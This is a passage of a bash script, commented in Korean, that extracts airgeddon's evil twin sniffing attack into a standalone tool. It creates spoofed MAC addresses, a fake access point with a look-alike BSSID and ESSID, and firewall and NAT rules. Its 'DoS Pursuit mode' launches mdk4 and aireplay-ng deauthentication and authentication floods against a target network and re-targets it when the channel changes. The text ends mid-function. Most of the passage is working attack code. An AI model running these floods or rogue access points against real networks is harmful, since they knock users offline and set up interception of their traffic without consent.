#!/usr/bin/env bash
#shellcheck disable=SC2154,SC2034

# ============================================================
# Evil Twin Sniffing Attack - Standalone Script
# Extracted from wfast.sh (airgeddon)
# ============================================================

# --- 설정 파일 로드 ---
_config_file="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/et_config.conf"
if [ ! -f "${_config_file}" ]; then
	echo "[!] 설정 파일을 찾을 수 없습니다: ${_config_file}" >&2
	exit 1
fi
# shellcheck source=et_config.conf
source "${_config_file}"

# --- 내부 고정값 (설정 파일에서 건드리지 않는 값) ---
mdk_command="mdk4"
check_kill_needed=1
interface_airmon_compatible=1
et_initial_state="Managed"
ifacemode="Managed"
right_arping=0
right_arping_command="arping"
able_to_play_sounds=0

# --- 내부 상수 ---
et_mode="et_sniffing"
AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING:-xterm}"
AIRGEDDON_DEBUG_MODE="${AIRGEDDON_DEBUG_MODE:-false}"
AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING="${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"
AIRGEDDON_5GHZ_ENABLED="${AIRGEDDON_5GHZ_ENABLED:-true}"
AIRGEDDON_EVIL_TWIN_ESSID_STRIPPING="${AIRGEDDON_EVIL_TWIN_ESSID_STRIPPING:-true}"

tmpdir="/tmp/et_sniffing_$$/"
scriptfolder="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/"
system_tmpdir="/tmp/"
airmon="airmon-ng"

hostapd_file="hostapd.conf"
dhcpd_file="dhcpd.conf"
et_processesfile="et_processes.txt"
control_et_file="et_control.sh"
channelfile="channel.txt"
ettercap_file="ettercap"
hostapd_wpe_file="hostapd-wpe.conf"
hostapd_wpe_log="hostapd-wpe.log"
hostapd_wpe_default_log="hostapd-wpe.log"
hostapd_mana_file="hostapd-mana.conf"
hostapd_mana_out="hostapd-mana.out"
hostapd_mana_log="hostapd-mana.log"
mana_cap_file="mana.cap"
mana_tmp_file="mana.tmp"
dhcp_path=""
dhcpd_path_changed=0
dnsmasq_file="dnsmasq.conf"
control_enterprise_file="enterprise_control.sh"
bettercap_file="bettercap"
bettercap_config_file="bettercap.cap"
bettercap_hook_file="bettercap.hook"
beef_file="beef.conf"
webserver_file="webserver.conf"
webserver_log="webserver.log"
webdir="webdir/"
certsdir="certsdir/"
enterprisedir="enterprisedir/"
asleap_pot_tmp="asleap.pot"
wps_attack_script_file="wps_attack.sh"
wps_out_file="wps_out.txt"
wep_attack_file="wep_attack.sh"
wep_key_handler="wep_key.txt"
wep_data="wep_data"
wepdir="wepdir/"
wep_besside_log="besside.log"
aircrack_pot_tmp="aircrack.pot"

dhcpd_pid_file="dhcpd.pid"
beef_found=0
beef_path=""
enterprise_mode=""

internet_dns1="8.8.8.8"
internet_dns2="8.8.4.4"

hostapd_wifi7_version="2.11"
hostapd_version=""

standard_resolution="1920x1080"
xratio=1
yratio=1
ywindow_edge_lines=5
ywindow_edge_pixels=25

iptables_nftables=0
iptables_cmd="iptables"
airgeddon_instance_name="ag_$$"
agpid_to_use="${BASHPID}"
ag_orchestrator_file="ag_orchestrator.txt"
routing_tmp_file="ag_routing_backup.txt"
routing_modified=0
nm_processes_killed=0
clean_all_iptables_nftables=1

session_name="airgeddon"
tmux_main_window="airgeddon"
global_process_pid=""
loopback_interface="lo"
loopback_ip="127.0.0.1"
loopback_ipv6="::1"

tmp_ettercaplog="${tmpdir}${ettercap_file}"

declare -a et_processes=()
declare -a dos_pursuit_mode_pids=()
declare -A possible_dhcp_leases_files=(
	[0]="/var/lib/dhcp/dhclient.leases"
	[1]="/var/lib/dhcpd/dhcpd.leases"
	[2]="/var/lib/dhcp/dhcpd.leases"
)
declare -A interfaces_band_info=()
declare -A original_macs=()
spoofed_mac=0
dos_pursuit_mode_attack_pid=""
dos_pursuit_mode_scan_pid=""
et_process_control_window=""
enterprise_process_control_window=""

# language_strings 스텁 (실제 출력 없음)
function language_strings() { :; }

# ============================================================
# 헬퍼 함수들
# ============================================================

function debug_print() {
	if "${AIRGEDDON_DEBUG_MODE:-false}"; then
		echo "Line:${BASH_LINENO[1]} ${FUNCNAME[1]}" >&2
	fi
	return 0
}

function add_contributing_footer_to_file() {
	debug_print
	{
	echo ""
	echo "---------------"
	echo ""
	echo "Captured by et_sniffing_attack.sh"
	} >> "${1}"
}

function physical_interface_finder() {
	debug_print
	local phy_iface
	phy_iface=$(basename "$(readlink "/sys/class/net/${1}/phy80211")" 2> /dev/null)
	echo "${phy_iface}"
}

function get_5ghz_band_info_from_phy_interface() {
	debug_print
	if iw phy "${1}" channels 2> /dev/null | grep -Ei "5180(\.0)? MHz" > /dev/null; then
		if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
			return 0
		else
			return 2
		fi
	fi
	return 1
}

function check_interface_supported_bands() {
	debug_print
	get_5ghz_band_info_from_phy_interface "${1}"
	case "$?" in
		"0")
			interfaces_band_info["${2},5Ghz_allowed"]=1
			interfaces_band_info["${2},text"]="2.4GHz, 5GHz"
		;;
		"1")
			interfaces_band_info["${2},5Ghz_allowed"]=0
			interfaces_band_info["${2},text"]="2.4GHz"
		;;
		"2")
			interfaces_band_info["${2},5Ghz_allowed"]=0
			interfaces_band_info["${2},text"]="2.4GHz, 5GHz (disabled)"
		;;
	esac
}

function disable_rfkill() {
	debug_print
	if hash rfkill 2> /dev/null; then
		rfkill unblock all > /dev/null 2>&1
	fi
}

function set_mode_without_airmon() {
	debug_print
	local error
	local mode
	ip link set "${1}" down > /dev/null 2>&1
	if [ "${2}" = "monitor" ]; then
		mode="monitor"
		iw "${1}" set monitor control > /dev/null 2>&1
	else
		mode="managed"
		iw "${1}" set type managed > /dev/null 2>&1
	fi
	error=$?
	ip link set "${1}" up > /dev/null 2>&1
	if [ "${error}" != 0 ]; then
		return 1
	fi
	return 0
}

function prepare_et_monitor() {
	debug_print
	disable_rfkill
	iface_phy_number=${phy_interface:3:1}
	iface_monitor_et_deauth="mon${iface_phy_number}"
	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
	iw phy "${phy_interface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
}

function set_spoofed_mac() {
	debug_print
	current_original_mac=$(cat < "/sys/class/net/${1}/address" 2> /dev/null)
	if [ "${spoofed_mac}" -eq 0 ]; then
		spoofed_mac=1
		declare -gA original_macs
		original_macs["${1}"]="${current_original_mac}"
	else
		if [ -z "${original_macs[${1}]}" ]; then
			original_macs["${1}"]="${current_original_mac}"
		fi
	fi
	new_random_mac=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')
	ip link set "${1}" down > /dev/null 2>&1
	ip link set dev "${1}" address "${new_random_mac}" > /dev/null 2>&1
	ip link set "${1}" up > /dev/null 2>&1
}

function compare_floats_greater_or_equal() {
	debug_print
	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>=n2) exit 0; exit 1}'
}

function get_hostapd_version() {
	debug_print
	hostapd_version=$(hostapd -v 2>&1 | grep -oiP '^hostapd v\K[0-9]+\.[0-9]+')
}

function generate_fake_bssid() {
	debug_print
	local digit_to_change
	local orig_digit
	digit_to_change="${1:10:1}"
	orig_digit=$((16#${digit_to_change}))
	while true; do
		((different_mac_digit=(orig_digit + 1 + RANDOM % 15) % 16))
		[[ "${different_mac_digit}" -ne "${orig_digit}" ]] && break
	done
	printf %s%X%s\\n "${1::10}" "${different_mac_digit}" "${1:11}"
}

function generate_fake_essid() {
	debug_print
	if "${AIRGEDDON_EVIL_TWIN_ESSID_STRIPPING:-true}"; then
		echo -e "${1}\xE2\x80\x8B"
	else
		echo -e "${1}"
	fi
}

function detect_screen_resolution() {
	debug_print
	resolution_detected=0
	if hash xdpyinfo 2> /dev/null; then
		if resolution=$(xdpyinfo 2> /dev/null | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x"); then
			resolution_detected=1
		fi
	fi
	if [ "${resolution_detected}" -eq 0 ]; then
		resolution=${standard_resolution}
	fi
	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
}

function set_xsizes() {
	debug_print
	xtotal=$(awk -v n1="${resolution_x}" "BEGIN{print n1 / ${xratio}}")
	if ! xtotaltmp=$(printf "%.0f" "${xtotal}" 2> /dev/null); then
		dec_char=","
		xtotal="${xtotal/./${dec_char}}"
		xtotal=$(printf "%.0f" "${xtotal}" 2> /dev/null)
	else
		xtotal=${xtotaltmp}
	fi
	xcentral_space=$((xtotal * 5 / 100))
	xhalf=$((xtotal / 2))
	xwindow=$((xhalf - xcentral_space))
}

function set_ysizes() {
	debug_print
	ytotal=$(awk -v n1="${resolution_y}" "BEGIN{print n1 / ${yratio}}")
	if ! ytotaltmp=$(printf "%.0f" "${ytotal}" 2> /dev/null); then
		dec_char=","
		ytotal="${ytotal/./${dec_char}}"
		ytotal=$(printf "%.0f" "${ytotal}" 2> /dev/null)
	else
		ytotal=${ytotaltmp}
	fi
	ywindowone=$((ytotal - ywindow_edge_lines))
	ywindowhalf=$((ytotal / 2 - ywindow_edge_lines))
	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
	ywindowseventh=$((ytotal / 7 - ywindow_edge_lines))
}

function set_ypositions() {
	debug_print
	second_of_three_position=$((resolution_y / 3 + ywindow_edge_pixels))
	second_of_seven_position=$((resolution_y / 7 + ywindow_edge_pixels))
	third_of_seven_position=$((resolution_y / 7 + resolution_y / 7 + ywindow_edge_pixels))
	fourth_of_seven_position=$((resolution_y / 7 + 2 * (resolution_y / 7) + ywindow_edge_pixels))
	fifth_of_seven_position=$((resolution_y / 7 + 3 * (resolution_y / 7) + ywindow_edge_pixels))
	sixth_of_seven_position=$((resolution_y / 7 + 4 * (resolution_y / 7) + ywindow_edge_pixels))
	seventh_of_seven_position=$((resolution_y / 7 + 5 * (resolution_y / 7) + ywindow_edge_pixels))
}

function set_windows_sizes() {
	debug_print
	set_xsizes
	set_ysizes
	set_ypositions
	g1_topleft_window="${xwindow}x${ywindowhalf}+0+0"
	g1_bottomleft_window="${xwindow}x${ywindowhalf}+0-0"
	g1_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g1_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
	g4_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
	g4_middleright_window="${xwindow}x${ywindowthird}-0+${second_of_three_position}"
	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"
}

function recalculate_windows_sizes() {
	debug_print
	detect_screen_resolution
	set_windows_sizes
}

function start_tmux_processes() {
	debug_print
	local window_name
	local command_line
	window_name="${1}"
	command_line="${2}"
	tmux kill-window -t "${session_name}:${window_name}" 2> /dev/null
	case "${4}" in
		"active")
			tmux new-window -t "${session_name}:" -n "${window_name}"
		;;
		*)
			tmux new-window -d -t "${session_name}:" -n "${window_name}"
		;;
	esac
	local tmux_color_cmd
	if [ -n "${3}" ]; then
		tmux_color_cmd="bg=#000000 fg=${3}"
	else
		tmux_color_cmd="bg=#000000"
	fi
	tmux setw -t "${window_name}" window-style "${tmux_color_cmd}"
	tmux send-keys -t "${session_name}:${window_name}" "${command_line}" ENTER
}

function get_tmux_process_id() {
	debug_print
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		local process_cmd_line
		local process_pid
		process_cmd_line=$(echo "${1}" | tr -d '"')
		while [ -z "${process_pid}" ]; do
			process_pid=$(ps --no-headers aux | grep "${process_cmd_line}" | grep -v "grep ${process_cmd_line}" | awk '{print $2}')
		done
		global_process_pid="${process_pid}"
	fi
}

function manage_output() {
	debug_print
	local xterm_parameters
	local tmux_command_line
	local xterm_command_line
	local window_name
	local command_tail
	xterm_parameters="${1}"
	tmux_command_line="${2}"
	xterm_command_line="\"${2}\""
	window_name="${3}"
	command_tail=" > /dev/null 2>&1 &"
	case "${AIRGEDDON_WINDOWS_HANDLING}" in
		"tmux")
			local tmux_color
			tmux_color=""
			[[ "${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="${BASH_REMATCH[2]}"
			case "${4}" in
				"active")
					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}" "active"
				;;
				*)
					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}"
				;;
			esac
		;;
		"xterm")
			eval "xterm ${xterm_parameters} -e ${xterm_command_line}${command_tail}"
		;;
	esac
}

function kill_tmux_windows() {
	debug_print
	local TMUX_WINDOWS_LIST=()
	local current_window_name
	readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
	for item in "${TMUX_WINDOWS_LIST[@]}"; do
		[[ "${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="${BASH_REMATCH[1]}"
		if [ "${current_window_name}" = "${tmux_main_window}" ]; then
			continue
		fi
		if [ -n "${1}" ]; then
			if [ "${current_window_name}" = "${1}" ]; then
				continue
			fi
		fi
		tmux kill-window -t "${session_name}:${current_window_name}"
	done
}

function delete_instance_orchestrator_file() {
	debug_print
	if [ -f "${system_tmpdir}${ag_orchestrator_file}" ]; then
		rm -rf "${system_tmpdir}${ag_orchestrator_file}" > /dev/null 2>&1
	fi
}

function is_last_airgeddon_instance() {
	debug_print
	local agpid=""
	readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat <"${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
	for item in "${AIRGEDDON_PIDS[@]}"; do
		[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && agpid="${BASH_REMATCH[2]}"
		if [[ "${agpid}" != "${agpid_to_use}" ]] && ps -p "${agpid}" > /dev/null 2>&1; then
			return 1
		fi
	done
	return 0
}

function is_first_routing_modifier_airgeddon_instance() {
	debug_print
	local agpid=""
	readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat <"${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
	for item in "${AIRGEDDON_PIDS[@]}"; do
		[[ "${item}" =~ ^(et)?([0-9]+)rs[0-1]$ ]] && agpid="${BASH_REMATCH[2]}"
		if [ "${agpid}" = "${BASHPID}" ]; then
			clean_all_iptables_nftables=0
			return 0
		fi
	done
	return 1
}

function control_routing_status() {
	debug_print
	local saved_routing_status_found=""
	local original_routing_status=""
	local etset=""
	local agpid=""
	local et_still_running=0
	if [ "${1}" = "start" ]; then
		readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat < "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
		for item in "${AIRGEDDON_PIDS[@]}"; do
			[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && etset="${BASH_REMATCH[1]}" && agpid="${BASH_REMATCH[2]}"
			if [ -z "${saved_routing_status_found}" ]; then
				[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && saved_routing_status_found="${BASH_REMATCH[3]}"
			fi
			if [[ "${agpid_to_use}" = "${agpid}" ]] && [[ "${etset}" != "et" ]]; then
				sed -ri "s:^(${agpid}):et\1:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
			fi
		done
		if [ -z "${saved_routing_status_found}" ]; then
			original_routing_status=$(cat /proc/sys/net/ipv4/ip_forward)
			sed -ri "s:^(et${agpid_to_use})$:\1rs${original_routing_status}:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
		fi
	else
		readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat < "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
		for item in "${AIRGEDDON_PIDS[@]}"; do
			[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && etset="${BASH_REMATCH[1]}" && agpid="${BASH_REMATCH[2]}"
			if [ -z "${saved_routing_status_found}" ]; then
				[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && saved_routing_status_found="${BASH_REMATCH[3]}"
			fi
			if [[ "${agpid_to_use}" = "${agpid}" ]] && [[ "${etset}" = "et" ]]; then
				sed -ri "s:^(et${agpid}):${agpid}:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
			fi
			if [[ "${agpid_to_use}" != "${agpid}" ]] && [[ "${etset}" = "et" ]]; then
				et_still_running=1
			fi
		done
		if [[ -n "${saved_routing_status_found}" ]] && [[ "${et_still_running}" -eq 0 ]]; then
			original_routing_status="${saved_routing_status_found//[^0-9]/}"
			echo "${original_routing_status}" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
		fi
	fi
}

function save_iptables_nftables() {
	debug_print
	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" list ruleset > "${system_tmpdir}${routing_tmp_file}" 2> /dev/null
	else
		"${iptables_cmd}-save" > "${system_tmpdir}${routing_tmp_file}" 2> /dev/null
	fi
}

function clean_this_instance_iptables_nftables() {
	debug_print
	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" delete table filter_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" delete table nat_"${airgeddon_instance_name}" 2> /dev/null
	else
		"${iptables_cmd}" -D INPUT -j input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -D FORWARD -j forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -F input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -F forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X forward_"${airgeddon_instance_name}" 2> /dev/null
	fi
}

function clean_all_iptables_nftables() {
	debug_print
	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" flush ruleset 2> /dev/null
	else
		"${iptables_cmd}" -F 2> /dev/null
		"${iptables_cmd}" -t nat -F 2> /dev/null
		"${iptables_cmd}" -t mangle -F 2> /dev/null
		"${iptables_cmd}" -t raw -F 2> /dev/null
		"${iptables_cmd}" -t security -F 2> /dev/null
		"${iptables_cmd}" -t mangle -X 2> /dev/null
		"${iptables_cmd}" -t raw -X 2> /dev/null
		"${iptables_cmd}" -t security -X 2> /dev/null
		"${iptables_cmd}" -D INPUT -j input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -D FORWARD -j forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -F input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -F forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X 2> /dev/null
		"${iptables_cmd}" -t nat -X 2> /dev/null
	fi
}

function prepare_iptables_nftables() {
	debug_print
	clean_this_instance_iptables_nftables
	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" add table ip filter_"${airgeddon_instance_name}"
		"${iptables_cmd}" add chain ip filter_"${airgeddon_instance_name}" forward_"${airgeddon_instance_name}" '{type filter hook forward priority 0; policy accept;}'
		"${iptables_cmd}" add chain ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" '{type filter hook input priority 0;}'
		"${iptables_cmd}" add table ip nat_"${airgeddon_instance_name}"
		"${iptables_cmd}" add chain ip nat_"${airgeddon_instance_name}" prerouting_"${airgeddon_instance_name}" '{type nat hook prerouting priority -100;}'
		"${iptables_cmd}" add chain ip nat_"${airgeddon_instance_name}" postrouting_"${airgeddon_instance_name}" '{type nat hook postrouting priority 100;}'
	else
		"${iptables_cmd}" -P FORWARD ACCEPT
		"${iptables_cmd}" -t filter -N input_"${airgeddon_instance_name}"
		"${iptables_cmd}" -A INPUT -j input_"${airgeddon_instance_name}"
		"${iptables_cmd}" -t filter -N forward_"${airgeddon_instance_name}"
		"${iptables_cmd}" -A FORWARD -j forward_"${airgeddon_instance_name}"
	fi
}

function clean_initialize_iptables_nftables() {
	debug_print
	if [ "${1}" = "start" ]; then
		if [[ "${clean_all_iptables_nftables}" -eq 1 ]] && is_first_routing_modifier_airgeddon_instance; then
			clean_all_iptables_nftables
		fi
		prepare_iptables_nftables
	else
		if is_last_airgeddon_instance; then
			clean_all_iptables_nftables
		else
			clean_this_instance_iptables_nftables
		fi
	fi
}

function clean_tmpfiles() {
	debug_print
	if [ "${1}" = "exit_script" ]; then
		rm -rf "${tmpdir}" > /dev/null 2>&1
		rm -rf "${scriptfolder}${hostapd_wpe_default_log}" > /dev/null 2>&1
		if [ "${dhcpd_path_changed}" -eq 1 ]; then
			rm -rf "${dhcp_path}" > /dev/null 2>&1
		fi
		if [ "${beef_found}" -eq 1 ]; then
			rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
		fi
		if is_last_airgeddon_instance; then
			delete_instance_orchestrator_file
		fi
	else
		rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
		rm -rf "${tmpdir}target.txt" > /dev/null 2>&1
		rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
		rm -rf "${tmpdir}nws"* > /dev/null 2>&1
		rm -rf "${tmpdir}clts"* > /dev/null 2>&1
		rm -rf "${tmpdir}${et_processesfile}" > /dev/null 2>&1
		rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
		rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
		rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
		rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
	fi
	if [ "${dhcpd_path_changed}" -eq 1 ]; then
		rm -rf "${dhcp_path}" > /dev/null 2>&1
	fi
}

function kill_pid_and_children_recursive() {
	debug_print
	local parent_pid=""
	local child_pids=""
	parent_pid="${1}"
	child_pids=$(pgrep -P "${parent_pid}" 2> /dev/null)
	for child_pid in ${child_pids}; do
		kill_pid_and_children_recursive "${child_pid}"
	done
	if [ -n "${child_pids}" ]; then
		pkill -P "${parent_pid}" &> /dev/null
	fi
	kill "${parent_pid}" &> /dev/null
	wait "${parent_pid}" 2> /dev/null
}

function kill_dos_pursuit_mode_processes() {
	debug_print
	for item in "${dos_pursuit_mode_pids[@]}"; do
		kill_pid_and_children_recursive "${item}"
	done
	if ! stty sane > /dev/null 2>&1; then
		reset > /dev/null 2>&1
	fi
	dos_pursuit_mode_pids=()
	sleep 1
}

function kill_et_windows() {
	debug_print
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		kill_dos_pursuit_mode_processes
	fi
	for item in "${et_processes[@]}"; do
		kill_pid_and_children_recursive "${item}"
	done
	if [ -n "${enterprise_mode}" ]; then
		kill "${enterprise_process_control_window}" &> /dev/null
	else
		kill "${et_process_control_window}" &> /dev/null
	fi
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		kill_tmux_windows
	fi
}

function recover_current_channel() {
	debug_print
	local recovered_channel
	recovered_channel=$(cat "${tmpdir}${channelfile}" 2> /dev/null)
	if [ -n "${recovered_channel}" ]; then
		channel="${recovered_channel}"
	fi
}

function launch_dos_pursuit_mode_attack() {
	debug_print
	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1

	recalculate_windows_sizes
	case "${1}" in
		"${mdk_command}")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"Aireplay")
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			dos_delay=3
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"Auth DoS")
			dos_delay=10
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
	esac

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		dos_pursuit_mode_attack_pid=$!
	fi
	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")

	if [ "${channel}" -gt 14 ]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo "[!] 5GHz 채널이지만 인터페이스가 지원하지 않음" >&2
			kill_dos_pursuit_mode_processes
			return 1
		else
			airodump_band_modifier="abg"
		fi
	else
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			airodump_band_modifier="bg"
		else
			airodump_band_modifier="abg"
		fi
	fi

	sleep "${dos_delay}"
	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" --band "${airodump_band_modifier}" > /dev/null 2>&1 &
	dos_pursuit_mode_scan_pid=$!
	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")

	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
		if [[ -n "${et_mode}" ]]; then
			launch_fake_ap
		fi
	fi

	local processes_file
	processes_file="${tmpdir}${et_processesfile}"
	for item in "${dos_pursuit_mode_pids[@]}"; do
		echo "${item}" >> "${processes_file}"
	done
}

pid_control_pursuit_mode() {
	debug_print
	local dos_pursuit_mode_ignored_channel=""
	rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
	echo "${channel}" > "${tmpdir}${channelfile}"
	while true; do
		sleep 5
		if grep "${bssid}" "${tmpdir}dos_pm-01.csv" > /dev/null 2>&1; then
			readarray -t DOS_PM_LINES_TO_PARSE < <(cat < "${tmpdir}dos_pm-01.csv" 2> /dev/null)
			for item in "${DOS_PM_LINES_TO_PARSE[@]}"; do
				if [[ "${item}" =~ ${bssid} ]]; then
					dos_pm_current_channel=$(echo "${item}" | awk -F "," '{print $4}' | sed 's/^[ ^t]*//')
					if [[ "${dos_pm_current_channel}" =~ ^([0-9]+)$ ]] && [[ "${BASH_REMATCH[1]}" -ne 0 ]] && [[ "${BASH_REMATCH[1]}" -ne "${channel}" ]]; then
						if [[ "${dos_pm_current_channel}" -gt 14 ]] && [[ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
							dos_pursuit_mode_ignored_channel="${dos_pm_current_channel}"
							continue
						fi
						dos_pursuit_mode_ignored_channel=""
						channel="${dos_pm_current_channel}"
						rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
						echo "${channel}" > "${tmpdir}${channelfile}"
						if [ -n "${et_mode}" ]; then
							sed -ri "s:(channel)=([0-9]{1,3}):\1=${channel}:" "${tmpdir}${hostapd_file}" 2> /dev/null
						fi
						kill_dos_pursuit_mode_processes
						launch_dos_pursuit_mode_attack "${1}" "relaunch"
					fi
